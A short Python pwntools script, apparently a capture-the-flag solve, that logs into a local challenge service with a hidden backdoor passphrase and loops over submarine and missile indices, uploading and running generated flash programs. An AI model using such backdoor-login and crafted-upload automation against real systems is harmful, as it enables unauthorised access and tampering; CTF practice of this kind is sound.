from pwn import *
import subprocess
import time

for sub in range(0, 5):
    for missil in range(0, 16):
        print(f"Doing: {sub} {missil}")
        # Sub, missile and upload command
        file = f'../programs/flsh.prg'

        # Initializing
        conn = remote('localhost',1337)
        ign=conn.recvuntil(b'\x98\n')
        conn.send(b'roodkcabur\n\n\x1b\n')
        ign=conn.recvuntil(b'AD----SO',)
        ign=conn.recvuntil(b'\x98\n')
        conn.send(b'\x1b\n')
        ign=conn.recvuntil(b'\x98\n')
        conn.send(bytes(f"fu{file}\n", 'utf-8'))
        ign=conn.recvuntil(b'(max: 1048576 bytes)                                 \xe2\x94\x82\n')

        result = subprocess.run(['python3', 'generate.py', f"{sub}", f"{missil}"], stdout=subprocess.PIPE)
        flash = result.stdout.decode()
        conn.send(flash.encode())

        conn.send(b'\n')
        ign = conn.recvuntil(b'uploaded')
        ign=conn.recvuntil(b'\x98\n')
        conn.send(b'\x1b\n')
        ign=conn.recvuntil(b'\x98\n')
        conn.send(b'\x1b\n')
        ign=conn.recvuntil(b'\x98\n')
        conn.send(b'p\n')
        ign=conn.recvuntil(b'\x98\n')
        conn.send(bytes(f"r{file}\n", 'utf-8'))
        ign=conn.recvuntil(b'\x98\n')
        print("Done with this")

        conn.close()
